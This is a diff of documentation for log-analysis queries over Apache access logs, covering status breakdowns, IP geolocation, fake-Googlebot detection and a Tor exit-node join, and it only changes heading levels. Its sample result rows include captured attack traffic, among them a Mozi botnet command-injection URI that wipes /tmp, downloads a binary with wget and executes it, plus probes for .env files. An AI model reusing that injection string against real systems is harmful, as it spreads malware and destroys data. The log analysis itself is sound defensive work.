@@ -1,4 +1,4 @@
-# ./view/view_single_file.sx
+### ./view/view_single_file.sx
 ```jsx
 LIST('file:/data/logs/web/access.log')
 | parse(pattern:$[./apache_access_log.sxp])
@@ -11,7 +11,7 @@ LIST('file:/data/logs/web/access.log')
 | `162.243.143.216` | 162.243.143.216 | *null* | *null* | `2020‑06‑01 07:42:43.000 +0300` | GET  | /manager/text/list |         1.1 | *null*         |      404 |   437 | ‑                         | Mozilla/5.0 zgrab/0.x                                                                                          | *null* |
 ....
 
-# ./view/view_indexed_by_pathtime.sx
+### ./view/view_indexed_by_pathtime.sx
 ```jsx
 INIT(from:now()[-14 day], to:now());
 
@@ -27,7 +27,7 @@ LIST('sas://remote/logs/apache/$yyyy$/$MM$/$dd$/$yyyy$-$MM$-$dd$_*access.log')
 | `34.239.156.212` | 34.239.156.212 | *null* | *null* | `2020‑07‑29 17:50:14.000 +0300` | GET  | /config/.env |         1.1 | *null*         |      404 |  2320 | ‑        | curl/7.69.1 | *null* |
 ....
 
-# query_hits_by_status_range.sx
+### ./query_hits_by_status_range.sx
 ```jsx
 @[./view/view_default.sx]
 | select(
@@ -53,7 +53,7 @@ LIST('sas://remote/logs/apache/$yyyy$/$MM$/$dd$/$yyyy$-$MM$-$dd$_*access.log')
 | `2020‑06‑05 00:00:00.000 +0300` |  1098 |        101 |          0 |        101 |          0 |        996 |          1 |          90.71 |
 ...
 
-# query_clientip_metainfo.sx
+### ./query_clientip_metainfo.sx
 ```jsx
 @[./view/view_default.sx]
 | select(clientIp, cc(clientIp), asname(clientIp), geo(clientIp), *)
@@ -69,7 +69,7 @@ LIST('sas://remote/logs/apache/$yyyy$/$MM$/$dd$/$yyyy$-$MM$-$dd$_*access.log')
 | `223.149.176.156` | CN | AS4134 Chinanet                 | 25.2239,112.1703  | 223.149.176.156 | *null* | *null* | `2020‑06‑01 08:10:23.000 +0300` | GET  | /shell?cd+/tmp;rm+‑rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws |         1.1 | *null*         |      404 |   493 | ‑                         | Hello, world                                                                                                        | *null* |
 ...
 
-# query_top_countries.sx
+### ./query_top_countries.sx
 ```jsx
 @[./view/view_default.sx]
 | select(count(*), cc(clientIp))
@@ -86,7 +86,7 @@ LIST('sas://remote/logs/apache/$yyyy$/$MM$/$dd$/$yyyy$-$MM$-$dd$_*access.log')
 |  1115 | GB |
 ...
 
-# query_find_fake_google_bots.sx
+### ./query_find_fake_google_bots.sx
 ```jsx
 @[./view/view_default.sx]
 | select(ASN(clientIp), *)
@@ -103,7 +103,7 @@ LIST('sas://remote/logs/apache/$yyyy$/$MM$/$dd$/$yyyy$-$MM$-$dd$_*access.log')
 |-----------------------------|----------------|----|--------------------------------------------------------------------------|------:|----------------|--------------|--------|--------|---------------------------------|------|----------|------------:|----------------|---------:|------:|----------|--------|
 | AS64425 SKB Enterprise B.V. | 52.3759,4.8975 | NL | Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html) | 64425 | `5.182.210.16` | 5.182.210.16 | *null* | *null* | `2020‑08‑07 15:44:40.000 +0300` | GET  | /api.php |         1.1 | *null*         |      404 |   437 | ‑        | *null* |
 
-# query_top_response_len.sx
+### ./query_top_response_len.sx
 ```jsx
 @[./view/view_default.sx]
 | select(timestamp, clientIp, verb, bytes, uri, *)
@@ -120,7 +120,7 @@ LIST('sas://remote/logs/apache/$yyyy$/$MM$/$dd$/$yyyy$-$MM$-$dd$_*access.log')
 | `2020‑08‑09 02:39:27.000 +0300` | `223.205.236.82` | *null* |       3665 | *null*                 | 223.205.236.82 | *null* | *null* |      *null* | ‑              |      408 | ‑        | ‑                                                                            | *null* |
 ...
 
-# join_with_tor_exit_nodes.sx
+### ./join_with_tor_exit_nodes.sx
 ```jsx
 @[./view/view_default.sx]
 | leftjoin(@[../tor_exit_nodes/view_cached.sx] ON left.clientIp = right.tor_ip)
